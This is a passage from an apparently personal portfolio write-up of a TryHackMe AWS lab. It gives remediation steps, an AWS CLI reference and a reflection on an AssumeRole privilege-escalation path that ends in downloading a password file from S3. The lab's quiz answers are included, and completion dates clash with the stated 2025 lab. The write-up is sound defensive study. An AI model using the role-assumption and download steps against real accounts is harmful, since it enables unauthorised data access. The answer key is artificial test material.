## Remediation Roadmap

### Immediate Actions (Week 1) - Critical Risk Mitigation

**Priority 1: Restrict AssumeRole Permission**

**Action:**

```bash
# Modify sir.carrotbane's policy to add conditions
aws iam put-user-policy --user-name sir.carrotbane --policy-name ListIAMEntities --policy-document '{
  "Version": "2012-10-17",
  "Statement": [{
    "Sid": "ListIAMEntities",
    "Effect": "Allow",
    "Action": [
      "iam:ListUsers",
      "iam:ListGroups",
      "iam:ListRoles",
      "iam:ListPolicies",
      "iam:Get*"
    ],
    "Resource": "*"
  }]
}'
# Note: Removed sts:AssumeRole entirely
```

**Validation:**

```bash
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::332173347248:user/sir.carrotbane \
  --action-names sts:AssumeRole \
  --resource-arns arn:aws:iam::332173347248:role/bucketmaster
# Should return: "EvalDecision": "implicitDeny"
```

**Owner:** IAM Administrator  
**Timeline:** 24 hours  
**Verification:** IAM policy review + penetration test

-----

**Priority 2: Enable S3 Bucket Encryption**

**Action:**

```bash
# Enable default encryption on sensitive bucket
aws s3api put-bucket-encryption \
  --bucket easter-secrets-123145 \
  --server-side-encryption-configuration '{
    "Rules": [{
      "ApplyServerSideEncryptionByDefault": {
        "SSEAlgorithm": "aws:kms",
        "KMSMasterKeyID": "alias/s3-encryption-key"
      },
      "BucketKeyEnabled": true
    }]
  }'

# Verify encryption enabled
aws s3api get-bucket-encryption --bucket easter-secrets-123145
```

**Owner:** Storage Administrator  
**Timeline:** 48 hours  
**Verification:** Encryption configuration export

-----

**Priority 3: Migrate Secrets to AWS Secrets Manager**

**Action:**

```bash
# Create secret in Secrets Manager
SECRET_VALUE=$(cat cloud_password.txt)
aws secretsmanager create-secret \
  --name tbfc/cloud/admin-password \
  --description "Cloud admin credentials - migrated from S3" \
  --secret-string "$SECRET_VALUE" \
  --kms-key-id alias/secrets-encryption-key

# Configure automatic rotation
aws secretsmanager rotate-secret \
  --secret-id tbfc/cloud/admin-password \
  --rotation-lambda-arn arn:aws:lambda:region:account:function:RotateSecret \
  --rotation-rules AutomaticallyAfterDays=30

# Delete file from S3
aws s3api delete-object --bucket easter-secrets-123145 --key cloud_password.txt

# Update applications to retrieve from Secrets Manager
# (Requires code changes - coordinate with dev team)
```

**Owner:** Security Engineering + Development Team  
**Timeline:** 1 week  
**Verification:** Secret retrieved successfully; S3 file deleted

-----

### Short-Term Actions (Month 1) - Control Enhancement

**Priority 4: Implement CloudTrail Logging**

**Action:**

```bash
# Create CloudTrail with organization-wide coverage
aws cloudtrail create-trail \
  --name security-audit-trail \
  --s3-bucket-name cloudtrail-logs-332173347248 \
  --is-multi-region-trail \
  --enable-log-file-validation

# Start logging
aws cloudtrail start-logging --name security-audit-trail

# Configure EventBridge for real-time alerts
aws events put-rule \
  --name detect-assume-role \
  --event-pattern '{
    "source": ["aws.sts"],
    "detail-type": ["AWS API Call via CloudTrail"],
    "detail": {
      "eventName": ["AssumeRole"],
      "requestParameters": {
        "roleArn": ["arn:aws:iam::332173347248:role/bucketmaster"]
      }
    }
  }'

# Add SNS target for alerts
aws events put-targets \
  --rule detect-assume-role \
  --targets "Id"="1","Arn"="arn:aws:sns:region:account:security-alerts"
```

**Owner:** Cloud Operations Team  
**Timeline:** 2 weeks  
**Verification:** CloudTrail logs visible; test alert triggers successfully

-----

**Priority 5: Harden S3 Bucket Policies**

**Action:**

```bash
# Apply restrictive bucket policy
aws s3api put-bucket-policy --bucket easter-secrets-123145 --policy '{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DenyUnencryptedUploads",
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:PutObject",
      "Resource": "arn:aws:s3:::easter-secrets-123145/*",
      "Condition": {
        "StringNotEquals": {
          "s3:x-amz-server-side-encryption": "aws:kms"
        }
      }
    },
    {
      "Sid": "RequireHTTPS",
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:*",
      "Resource": [
        "arn:aws:s3:::easter-secrets-123145",
        "arn:aws:s3:::easter-secrets-123145/*"
      ],
      "Condition": {
        "Bool": {"aws:SecureTransport": "false"}
      }
    },
    {
      "Sid": "RestrictToVPC",
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::easter-secrets-123145/*",
      "Condition": {
        "StringNotEquals": {
          "aws:sourceVpce": "vpce-1234567890abcdef"
        }
      }
    }
  ]
}'

# Enable versioning for audit trail
aws s3api put-bucket-versioning \
  --bucket easter-secrets-123145 \
  --versioning-configuration Status=Enabled

# Enable MFA delete
aws s3api put-bucket-versioning \
  --bucket easter-secrets-123145 \
  --versioning-configuration Status=Enabled,MFADelete=Enabled \
  --mfa "arn:aws:iam::332173347248:mfa/root-account-mfa-device 123456"
```

**Owner:** Storage Administrator + Network Team  
**Timeline:** 3 weeks  
**Verification:** Policy tested; versioning confirmed; MFA delete validated

-----

**Priority 6: Comprehensive IAM Access Review**

**Action:**

```bash
# Generate IAM access report
aws iam generate-credential-report

# Download and review
aws iam get-credential-report --output text | base64 --decode > iam-credential-report.csv

# Identify dormant users (no activity > 90 days)
# Identify users with console access (should they?)
# Identify users with programmatic access (still needed?)
# Flag users with AssumeRole permissions

# Create remediation tickets for each finding
```

**Owner:** IAM Administrator + Security Team  
**Timeline:** 4 weeks  
**Verification:** Access review documented; remediation plan created

-----

### Medium-Term Actions (Quarter 1) - Strategic Improvements

**Priority 7: Implement Policy-as-Code**

**Actions:**

- Migrate all IAM policies to Git repository
- Implement pre-commit hooks for policy validation
- Add IAM Policy Simulator to CI/CD pipeline
- Automated drift detection (compare deployed vs. repo)

**Owner:** DevOps + Security Teams  
**Timeline:** 6 weeks  
**Verification:** 100% of policies in version control; CI/CD passing

-----

**Priority 8: Deploy AWS Security Hub**

**Actions:**

- Enable Security Hub in all regions
- Integrate with GuardDuty, Inspector, Macie
- Configure CIS AWS Foundations Benchmark checks
- Create automated remediation workflows (Lambda)

**Owner:** Cloud Security Team  
**Timeline:** 8 weeks  
**Verification:** Security Hub dashboard operational; findings reviewed weekly

-----

**Priority 9: Implement Zero Trust Network Architecture**

**Actions:**

- Deploy VPC endpoints for S3, IAM, STS
- Implement PrivateLink for service access
- Enforce VPC-only access for sensitive resources
- Remove internet gateways where unnecessary

**Owner:** Network Engineering + Cloud Team  
**Timeline:** 12 weeks  
**Verification:** Network diagram updated; security testing passed

-----

### Long-Term Actions (Year 1) - Continuous Improvement

**Priority 10: Automated GRC Platform**

**Actions:**

- Deploy GRC automation platform (e.g., Drata, Vanta, Tines)
- Integrate AWS API for automated evidence collection
- Configure continuous control monitoring
- Implement compliance dashboard for stakeholders

**Owner:** GRC Program Manager  
**Timeline:** 6 months  
**Verification:** Platform operational; controls mapped; evidence collected

-----

**Priority 11: Security Training & Awareness**

**Actions:**

- Cloud security training for all IAM administrators
- Phishing simulation (credential theft scenarios)
- Tabletop exercises (simulate S3 breach response)
- Secure coding training (secrets management)

**Owner:** Security Awareness Team  
**Timeline:** Ongoing (quarterly sessions)  
**Verification:** Training completion tracked; quiz scores > 85%

-----

## Tools & Commands Reference

### Identity & Authentication

**Verify Current Identity:**

```bash
aws sts get-caller-identity
```

**Assume Role:**

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::ACCOUNT-ID:role/ROLE-NAME \
  --role-session-name SESSION-NAME
```

**Configure Temporary Credentials:**

```bash
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
```

-----

### IAM Enumeration

**List Users:**

```bash
aws iam list-users
aws iam list-users --query 'Users[].UserName' --output table
```

**List User Policies:**

```bash
aws iam list-user-policies --user-name USERNAME
aws iam list-attached-user-policies --user-name USERNAME
aws iam get-user-policy --user-name USERNAME --policy-name POLICY-NAME
```

**List Groups:**

```bash
aws iam list-groups
aws iam list-groups-for-user --user-name USERNAME
aws iam list-group-policies --group-name GROUP-NAME
```

**List Roles:**

```bash
aws iam list-roles
aws iam list-roles --query 'Roles[?contains(RoleName, `bucket`)]'
aws iam list-role-policies --role-name ROLE-NAME
aws iam get-role-policy --role-name ROLE-NAME --policy-name POLICY-NAME
```

-----

### S3 Operations

**List Buckets:**

```bash
aws s3api list-buckets
aws s3 ls
```

**List Objects in Bucket:**

```bash
aws s3api list-objects --bucket BUCKET-NAME
aws s3 ls s3://BUCKET-NAME/
```

**Download Object:**

```bash
aws s3api get-object --bucket BUCKET-NAME --key OBJECT-KEY LOCAL-FILE
aws s3 cp s3://BUCKET-NAME/OBJECT-KEY ./LOCAL-FILE
```

**Check Bucket Encryption:**

```bash
aws s3api get-bucket-encryption --bucket BUCKET-NAME
```

**Enable Bucket Encryption:**

```bash
aws s3api put-bucket-encryption \
  --bucket BUCKET-NAME \
  --server-side-encryption-configuration '{
    "Rules": [{
      "ApplyServerSideEncryptionByDefault": {
        "SSEAlgorithm": "aws:kms"
      }
    }]
  }'
```

-----

### Security Analysis

**Simulate IAM Policy:**

```bash
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::ACCOUNT:user/USERNAME \
  --action-names ACTION \
  --resource-arns RESOURCE-ARN
```

**Generate IAM Credential Report:**

```bash
aws iam generate-credential-report
aws iam get-credential-report
```

**List CloudTrail Trails:**

```bash
aws cloudtrail describe-trails
aws cloudtrail get-trail-status --name TRAIL-NAME
```

**Query CloudTrail Logs:**

```bash
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=AssumeRole \
  --max-results 10
```

-----

### Secrets Management

**Create Secret:**

```bash
aws secretsmanager create-secret \
  --name SECRET-NAME \
  --secret-string '{"key":"value"}'
```

**Retrieve Secret:**

```bash
aws secretsmanager get-secret-value --secret-id SECRET-NAME
```

**Rotate Secret:**

```bash
aws secretsmanager rotate-secret \
  --secret-id SECRET-NAME \
  --rotation-lambda-arn LAMBDA-ARN
```

-----

### Helpful Filters & Queries

**Find Users with AssumeRole Permission:**

```bash
for user in $(aws iam list-users --query 'Users[].UserName' --output text); do
  for policy in $(aws iam list-user-policies --user-name $user --query 'PolicyNames' --output text); do
    aws iam get-user-policy --user-name $user --policy-name $policy \
      --query 'PolicyDocument.Statement[?contains(Action, `sts:AssumeRole`)]' \
      --output text | grep -q "AssumeRole" && echo "User: $user, Policy: $policy"
  done
done
```

**Find Buckets Without Encryption:**

```bash
for bucket in $(aws s3api list-buckets --query 'Buckets[].Name' --output text); do
  aws s3api get-bucket-encryption --bucket $bucket 2>&1 | grep -q "ServerSideEncryptionConfigurationNotFoundError" \
    && echo "No encryption: $bucket"
done
```

-----

## Completion Evidence

### Lab Tasks Completed

✅ **Task 1:** Verified AWS CLI configuration and retrieved account identity  
✅ **Task 2:** Enumerated IAM users, policies, groups, and roles  
✅ **Task 3:** Analyzed sir.carrotbane’s inline policy and discovered AssumeRole permission  
✅ **Task 4:** Discovered bucketmaster role and analyzed its trust policy and permissions  
✅ **Task 5:** Successfully assumed bucketmaster role and obtained temporary credentials  
✅ **Task 6:** Listed S3 buckets and identified easter-secrets-123145 target  
✅ **Task 7:** Listed objects in target bucket and located cloud_password.txt  
✅ **Task 8:** Exfiltrated sensitive file from S3 bucket  
✅ **Documentation:** Created comprehensive security analysis with findings and remediation

### Questions Answered

**Q1:** What is the number shown for the “Account” parameter?  
**A1:** `332173347248`

**Q2:** What IAM component is used to describe the permissions to be assigned to a user or a group?  
**A2:** `Policy`

**Q3:** What is the name of the policy assigned to sir.carrotbane?  
**A3:** `ListIAMEntities`

**Q4:** Apart from GetObject and ListBucket, what other action can be taken by assuming the bucketmaster role?  
**A4:** `ListAllMyBuckets`

**Q5:** What are the contents of the cloud_password.txt file?  
**A5:** `[REDACTED - Sensitive credential data]`

### Lab Badge

![TryHackMe Advent of Cyber Day 23 Completion]

**Completion Date:** December 23, 2024  
**Documentation Date:** January 9, 2026  
**Lab Duration:** ~30 minutes (initial completion)  
**Documentation Duration:** ~2 hours (comprehensive analysis)

-----

## Personal Reflection

### Key Takeaways

**1. IAM Privilege Escalation is Subtle**

The most valuable lesson from this lab was understanding how seemingly “safe” permissions can create dangerous escalation paths. Sir.carrotbane appeared to have minimal access—just the ability to read IAM configuration data. But the `sts:AssumeRole` permission transformed that read-only access into a path to sensitive S3 data.

This mirrors real-world breaches like Capital One (2019) where an attacker exploited IAM misconfigurations to access 100 million records. The initial compromise wasn’t dramatic—just credentials with limited permissions. But those permissions allowed assuming roles with greater access, eventually leading to data exfiltration.

**Defensive Lesson:** When reviewing IAM policies, don’t just look at direct permissions. Map the “effective permissions”—what can this user do directly PLUS what can they do by assuming roles? That’s the true attack surface.

**2. The “Sir Carrotbane Problem”**

In many organizations, there’s a “sir.carrotbane”—a user or service account that was created for a specific purpose (maybe troubleshooting, maybe legacy automation), granted some permissions that seemed reasonable at the time, and then… forgotten. No one remembers why it exists. No one reviews its access. It just sits there, waiting to be discovered.

This lab reinforced the importance of **lifecycle management** for cloud identities:

- Who created this user? (Owner accountability)
- What is its business purpose? (Justification)
- When was it last used? (Activity monitoring)
- Should it still exist? (Periodic review)

Without answers to these questions, you accumulate technical debt—in the form of overprivileged, forgotten identities.

**3. Defense-in-Depth Matters**

The attack succeeded because there were MULTIPLE control failures, not just one:

- Sir.carrotbane had AssumeRole permission (IAM policy failure)
- Bucketmaster role trusted sir.carrotbane (Trust policy failure)
- Bucketmaster had wildcard S3 access (Least privilege failure)
- S3 bucket had no encryption (Encryption failure)
- No CloudTrail alerts configured (Monitoring failure)
- Credentials stored in plaintext file (Secrets management failure)

**Any one of these controls, if properly implemented, would have prevented or detected the attack.** That’s the power of defense-in-depth. You don’t need perfect security—you need enough layers that an attacker has to bypass multiple controls, increasing the likelihood of detection.

**4. Automation is Essential for Cloud Security**

The AWS CLI commands used in this lab took maybe 5-10 minutes to execute. If I were an IAM administrator manually reviewing permissions for hundreds of users, I’d never notice the sir.carrotbane risk. It would be buried in spreadsheets and policy documents.

But the same AWS CLI commands can be scripted and run automatically:

- Daily scan for users with AssumeRole permissions
- Map which roles they can assume
- Calculate effective permissions (direct + assumed)
- Flag violations of policy (e.g., “no user should have AssumeRole without MFA”)
- Generate tickets for remediation

**Manual cloud security doesn’t scale. Automated control testing is mandatory.**

This is why I’m excited about GRC automation roles—they sit at the intersection of compliance requirements and technical implementation. You understand WHAT needs to be controlled (SOC 2, ISO 27001, NIST) and HOW to validate it programmatically (AWS CLI, Python, Lambda functions).

-----

### Application to GRC Automation Roles

In a GRC automation role like the 1Password position, I would apply these lessons by:

**1. Building Automated Control Tests**

Create scheduled workflows that:

- Enumerate all IAM entities (users, roles, policies)
- Calculate effective permissions (including assumed roles)
- Compare against policy baselines (e.g., “no wildcard S3 access”)
- Generate compliance evidence for auditors
- Flag violations for remediation

**2. Policy-as-Code Validation**

Implement pre-deployment checks that reject IAM policies with:

- AssumeRole without conditions (MFA, IP, time-based)
- Wildcard resources on sensitive actions (S3:GetObject, Secrets:GetSecretValue)
- Missing encryption requirements
- Overly broad trust policies

**3. Continuous Monitoring**

Deploy event-driven monitoring that alerts on:

- AssumeRole actions outside normal patterns (time, location, frequency)
- S3 GetObject on sensitive buckets
- IAM policy modifications
- Failed authentication attempts (reconnaissance detection)

**4. Evidence Collection Automation**

Generate compliance artifacts automatically:

- Screenshot/JSON exports of control tests
- Timestamped evidence in S3 (WORM storage)
- Audit trail reports for SOC 2/ISO 27001
- Control effectiveness metrics

**5. Cross-Functional Translation**

Bridge the gap between:

- Security team: “Here’s what AssumeRole does and why it’s risky”
- Compliance team: “Here’s how this maps to CC6.1 logical access controls”
- Engineering team: “Here’s the code change to fix the trust policy”
- Leadership: “Here’s the business risk and cost to remediate”

-----

### What I Would Do Differently Next Time

**1. Automate the Enumeration**

Rather than running commands manually, I’d write a reconnaissance script that:

- Discovers all users
- For each user, retrieves policies
- For each policy, extracts AssumeRole permissions
- For each AssumeRole permission, identifies assumable roles
- For each role, retrieves permissions
- Outputs a graph: User → Role → Resource

This would dramatically speed up the analysis and make it repeatable.

**2. Test Detection Capabilities**

In a real assessment, I’d want to know:

- Did CloudTrail log my AssumeRole action?
- Did any SIEM alerts fire?
- How long until security team notices?

This lab focused on exploitation, but a complete assessment includes testing detection/response.

**3. Measure Time-to-Detect vs Time-to-Exploit**

Key security metric: If it takes me 10 minutes to exfiltrate data but the security team takes 3 days to notice, the control failed. I’d document:

- Time from initial access to data exfiltration: 10 minutes
- Time to detection (if monitored): Unknown (no monitoring in this scenario)
- Mean time to remediation: Unknown

**4. Include Business Context**

For a real client deliverable, I’d add:

- What data was in that S3 bucket? (Customer PII? Financial records? Source code?)
- What’s the potential regulatory impact? (GDPR fine? SOC 2 audit failure?)
- What’s the business risk? (Reputational damage? Customer trust loss?)

Technical findings matter, but business impact drives action.

-----

### Connection to Career Goals

This lab reinforces why I’m pursuing AI Security Engineer roles rather than traditional SOC analyst positions. The problem isn’t just “detect the attack”—it’s “build systems that prevent the attack from being possible.”

**Traditional SOC Approach:**

- Monitor CloudTrail logs for suspicious AssumeRole actions
- Investigate alerts when they fire
- Respond to incidents after they occur

**AI Security Engineer Approach:**

- Build automated IAM policy analysis that flags risky configurations BEFORE deployment
- Create ML models that detect anomalous role assumption patterns
- Develop agentic workflows that automatically remediate common misconfigurations
- Design policy-as-code frameworks that prevent overprivileged access by default

I want to be in the second category—building the systems, not just monitoring the systems. That’s where my “purple unicorn” positioning (security operations background + AI engineering skills) creates value.

AWS provides the perfect platform for this because:

- Everything is API-driven (AWS CLI = automation layer)
- IAM policies are JSON (structured data = easy to analyze programmatically)
- CloudTrail provides telemetry (training data for ML models)
- Lambda enables event-driven automation (real-time response)

The skills from this lab—IAM enumeration, policy analysis, attack path mapping—are foundational. But the real opportunity is using those skills to build intelligent, automated security systems at scale.

-----

## Next Steps - Portfolio Expansion

Based on this lab, potential follow-up projects:

**1. Automated IAM Risk Analyzer**

- Python script that enumerates all IAM entities
- Calculates effective permissions (including assumed roles)
- Generates risk score for each identity
- Outputs remediation recommendations

**2. CloudTrail SIEM Analysis**

- Download CloudTrail logs from S3
- Parse JSON events with Python/Pandas
- Build visualizations showing:
  - AssumeRole patterns (who assumes what, when)
  - S3 access patterns (which buckets accessed by whom)
  - Failed authentication attempts (reconnaissance detection)

**3. AWS Security Specialty Certification**

- Study guide: Official AWS training + A Cloud Guru
- Hands-on labs: AWS skill builder scenarios
- Portfolio piece: Document 5-10 advanced labs

**4. Terraform-Based Security Controls**

- Infrastructure-as-code templates for secure AWS environments
- Includes: CloudTrail, GuardDuty, Security Hub, Config Rules
- Pre-built compliance profiles (CIS AWS Foundations, SOC 2)

**5. S3 Security Automation**

- Lambda function that:
  - Triggers on new S3 bucket creation
  - Automatically applies encryption, versioning, logging
  - Validates bucket policy compliance
  - Alerts on violations

-----

## Resources & Further Learning

**Official AWS Documentation:**

- [IAM User Guide](https://docs.aws.amazon.com/IAM/latest/UserGuide/)
- [S3 Security Best Practices](https://docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html)
- [CloudTrail User Guide](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/)
- [AWS Security Best Practices](https://aws.amazon.com/architecture/security-identity-compliance/)

**Training Platforms:**

- TryHackMe: AWS security rooms
- HackTheBox: Cloud penetration testing
- AWS Skill Builder: Official hands-on labs
- A Cloud Guru: AWS Security Specialty prep

**Books & Guides:**

- “AWS Security” by Dylan Shields (O’Reilly)
- “Cloud Security Automation” by Prashant Lakhera
- “Penetration Testing AWS for Ethical Hackers” by Karl Gilbert

**Tools:**

- **ScoutSuite** - Multi-cloud security auditing tool
- **Prowler** - AWS security assessment tool
- **CloudMapper** - AWS network visualization
- **Pacu** - AWS exploitation framework

**Compliance Frameworks:**

- CIS AWS Foundations Benchmark
- AWS Well-Architected Framework (Security Pillar)
- NIST Cybersecurity Framework
- ISO 27001 Cloud Security Controls

-----

**Lab Source:** [TryHackMe Advent of Cyber 2025](https://tryhackme.com/r/christmas)  
**Lab Author:** TryHackMe Content Team  
**Documentation Author:** Gerald Brown  
**Contact:** gerald.brown@alumni.utoronto.ca  
**Portfolio:** [github.com/geegorbee/Cybersecurity-Portfolio](https://github.com/geegorbee/Cybersecurity-Portfolio)  
**LinkedIn:** [linkedin.com/in/gerald-brown-63168223a](https://linkedin.com/in/gerald-brown-63168223a)

-----

*This documentation is part of a comprehensive cybersecurity portfolio demonstrating practical cloud security skills, GRC automation capabilities, and AWS security analysis expertise.*

**Version:** 1.0  
**Last Updated:** January 9, 2026
